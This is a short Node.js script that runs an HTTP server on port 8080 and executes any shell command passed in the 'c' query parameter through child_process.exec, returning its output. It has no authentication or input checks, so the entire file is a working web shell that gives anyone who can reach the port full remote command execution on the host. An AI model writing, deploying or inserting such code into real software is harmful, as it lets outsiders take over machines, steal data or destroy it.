/**
 * Created by JetBrains WebStorm.
 * User: kailu
 * Date: 12-4-14
 * Time: 下午10:31
 * To change this template use File | Settings | File Templates.
 */
var http=require('http'),url=require('url'),exec=require('child_process').exec;
http.createServer(function(request,response){
	var comm=url.parse(request.url,true).query.c;
	if(!comm){
			response.writeHead(200, {"Content-Type": "text/plain"});
			response.write('please use /?c=command');
			response.end();
	}else{
		exec(comm,function(e,stdout,stderr){
			var resp=''
			if(e){
				resp=stderr;
			}else{
				resp=stdout;
			}
				response.writeHead(200, {"Content-Type": "text/plain"});
				response.write('$ : '+resp);
				response.end();
		})
	}

	//console.log(info);

}).listen(8080);